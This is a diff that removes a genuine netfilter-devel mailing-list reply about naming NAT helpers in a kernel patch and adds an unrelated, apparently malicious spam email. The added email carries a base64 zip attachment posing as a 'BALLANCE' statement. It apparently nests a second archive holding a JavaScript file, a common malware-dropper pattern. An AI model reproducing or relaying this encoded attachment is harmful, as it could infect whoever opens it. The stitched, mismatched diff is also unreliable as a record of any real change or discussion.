@@ -1,75 +1,55 @@
-From: "Gao Feng" <gfree.wind@foxmail.com>
-Subject: RE: [PATCH nf v5 2/3] netfilter: nat_helper: Make sure every proto nat module uses its nat_helper
-Date: Mon, 17 Apr 2017 08:50:35 +0800
-Message-ID: <001e01d2b714$a702c050$f50840f0$@foxmail.com>
-References: <cover.1490955730.git.fgao@ikuai8.com> <74aaa9aaa69d65fa46d56faf5c4de671abf4a5cf.1490955730.git.fgao@ikuai8.com> <20170414001107.GA28754@salvia> <000001d2b4b8$97256c40$c57044c0$@foxmail.com> <20170414010249.GA29837@salvia>
+From: <wvhyvcm.abyxg@jippii.com>
+Subject: (unknown)
+Date: Mon, 17 Apr 2017 02:26:43 -0000
+Message-ID: <149239600381.20709.3187554117700732242@entelvias.com.br>
 Mime-Version: 1.0
-Content-Type: text/plain;
-        charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: <netfilter-devel@vger.kernel.org>
-To: "'Pablo Neira Ayuso'" <pablo@netfilter.org>
+Content-Type: application/zip; name="BALLANCE-84324839693493-netfilter-devel.zip"
+Content-Transfer-Encoding: base64
+To: "netfilter-devel" <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from smtpbgsg2.qq.com ([54.254.200.128]:52636 "EHLO smtpbgsg2.qq.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1756951AbdDQAux (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
-        Sun, 16 Apr 2017 20:50:53 -0400
-In-Reply-To: <20170414010249.GA29837@salvia>
-Content-Language: zh-cn
+Received: from Dinamico-102-5.entelvias.com.br ([131.108.102.5]:56770 "HELO
+        entelvias.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S932331AbdDQC0s (ORCPT
+        <rfc822;netfilter-devel@vger.kernel.org>);
+        Sun, 16 Apr 2017 22:26:48 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-Hi Pablo,
-
-> From: netfilter-devel-owner@vger.kernel.org
-> [mailto:netfilter-devel-owner@vger.kernel.org] On Behalf Of Pablo Neira
-> Ayuso
-> On Fri, Apr 14, 2017 at 08:46:44AM +0800, Gao Feng wrote:
-> > > -----Original Message-----
-> > > From: Pablo Neira Ayuso [mailto:pablo@netfilter.org] On Fri, Mar 31,
-> > > 2017 at 06:38:20PM +0800, gfree.wind@foxmail.com wrote:
-> > > > +static struct nf_ct_nat_helper pptp_nat = {
-> > > > +	.name			= "pptp_nat",
-> > >
-> > > Why all these with "xyz_nat" names?
-> >
-> > I just used the variable name before.
-> > How about rename it to "xyz_nat_helper"?
-> > >
-> > > This is going to break ctnetlink, as this is the name that
-> > > identifies the
-> > NAT
-> > > helper to be used.
-> 
-> This name is exposed to userspace, right?
-> 
-> So FTP uses to rely on the "nat-follow-master" expectfn. But now the name
-will
-> be "ftp_nat".
-> 
-> If that is the case, this would break backward.
-
-I am a little confusing.
-The " struct nf_ct_nat_helper ftp_nat ftp_nat" is one new variable, while
-the original variable 
-"struct nf_ct_nat_helper follow_master_nat" name still is "
-"nat-follow-master".
-
-I couldn't figure about how could this break backward.
-Do you think the name " ftp_nat " should use " ftp_nat_follow_master"?
-
-BTW, how about use nat_helper pointer instead of expect fn?
-As I mentioned before, it could avoid two assignment. 
-Is it ok?
-
-Regards
-Feng
-
-> --
-> To unsubscribe from this list: send the line "unsubscribe netfilter-devel"
-in the
-> body of a message to majordomo@vger.kernel.org More majordomo info at
-> http://vger.kernel.org/majordomo-info.html
-
-
-
+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
+ZAcAAAAA
